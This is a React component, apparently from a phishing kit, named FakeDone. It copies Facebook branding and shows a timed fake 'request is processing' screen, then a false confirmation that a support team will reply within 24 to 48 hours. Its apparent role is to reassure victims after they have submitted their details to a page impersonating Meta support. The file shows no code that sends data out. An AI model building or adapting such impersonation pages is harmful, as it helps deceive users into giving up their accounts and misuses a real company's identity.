import React, { useEffect, useState } from "react";
import { useNavigate, useParams, useSearchParams } from "react-router-dom";

import { BrowserView, MobileView, isBrowser, isMobile } from 'react-device-detect';
const WAIT_MINUTE = 10;
const PERCENT_FULL = 100;
const ONE_PERCENT = 1;

function FakeDone() {

  const [progress, setProgress] = useState(0);
  const [countdown, setCountdown] = useState(WAIT_MINUTE); // 2 phút = 120 giây

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress((prevProgress) => {
        const newProgress =
          prevProgress + (ONE_PERCENT / WAIT_MINUTE) * PERCENT_FULL;
        return Math.min(newProgress, PERCENT_FULL);

      });

      setCountdown((prevCountdown) => prevCountdown - ONE_PERCENT);


      if (countdown <= 0) {
        clearInterval(interval);
      }
    }, 1000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  const params = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { userID } = params;
  const [isShowProgress, setisShowProgress] = useState(false);

  useEffect(() => {
    setisShowProgress(true);
  }, []);

  return (
      <div>
      <div className="Authentication__header"><div className="auth__header d-flex col-12 justify-content-between"><div className="auth__header-logo col-md-5 col-12"><img src="/assets/fb.d95f74a211e4eb5f4257.png" alt="fb" className="img-fluid" width="200"/></div>
      {!isMobile &&
      <div className="auth__header-search input-group col-md-5 d-flex pe-5 me-7"><input disabled={true} type="text" className="form-control" aria-describedby="basic-addon"/><span className="input-group-text" id="basic-addon1"><ion-icon name="search" role="img" className="md hydrated"></ion-icon></span>
      </div>
      }
      </div></div>
      <div style={{display:'flex',height: '100vh'}}>
      <div style={{display: (progress >= 100) ? 'flex' : 'none',height: '100vh' ,margin: 'auto', justifyContent: 'center', alignItems: 'center',flexDirection: 'column',maxWidth: '600px',padding: '15px',textAlign: 'center'}}>
                        <div className="mb-4">
                            <div className="swal2-icon swal2-success swal2-icon-show" style={{display: 'flex'}}>
                                <div className="swal2-success-circular-line-left" style={{backgroundcolor: '#000000'}}></div>
                                <span className="swal2-success-line-tip"></span><span className="swal2-success-line-long"></span>
                                <div className="swal2-success-ring"></div>
                                <div className="swal2-success-fix" style={{backgroundcolor: '#000000'}}></div>
                                <div className="swal2-success-circular-line-right" style={{backgroundcolor: '#000000'}}></div>
                            </div>
                        </div>
                        <h3 className="mb-2" style={{color: '#444444'}}>Your request is sent successfully</h3>
                        <p className="mb-3" style={{fontsize: '15px',color: '#838080'}}>
                            It usually takes 24 to 48 hours to receive an update from our support team. However, sometimes it depends on the complexity of the task, so don't worry. We will contact you via email or phone number as soon as possible.
                        </p>
                        <div className="mt-3"></div>
                        <button className="chat_btn" style={{padding: '8px 30px'}}><a style={{textDecoration:'none',color:'white'}}rel="noopener noreferrer" href="https://www.facebook.com/policies_center/commerce">Go to meta legal policy</a></button>
      </div>

      <div style={{display: (progress < 100) ? 'flex' : 'none',margin: 'auto',justifyContent: 'center',alignItems: 'center',flexDirection: 'column',maxWidth: '600px',padding: '15px', textAlign:'center'}}>
          <div className="mb-4">
            <div className="loader" style={{margin: '0px',width: '36px',height: '36px',borderwidth: '5px'}}></div>
          </div>
          <h3 className="mb-2" style={{color: '#444444'}}>Your request is processing</h3>
          <p className="mb-3" style={{fontsize: '15px',color: '#838080'}}>Please wait a moment. We are checking your information. Please do not leave this site once processing is complete.</p>
          {/* <div className="mt-4"></div>
          <div style={{padding: '0px 1rem',width: '100%'}}>
                  <div 
                  className="p-4">
                    <div className="relative pt-1">
                      <div className="relative flex mb-2 items-center justify-between">
                        <div className="text-left">
                          <span className="text-xs font-semibold inline-block text-blue-600">
                              Processing process
                          </span>
                        </div>
                        <div className="text-right">
                          <span className="text-xs font-semibold inline-block text-blue-600">
                            {progress.toFixed(1)}%
                          </span>
                        </div>
                      </div>
                      <div className="overflow-hidden h-2 mb-4 text-xs flex rounded bg-blue-200">
                        <div
                          style={{ width: `${progress.toFixed(1)}%` }}
                          className="shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center bg-blue-500"
                        ></div>
                      </div>
                    </div>
                  </div>
          </div> */}
          </div>
          </div>
          </div>
  );
}

export default FakeDone;
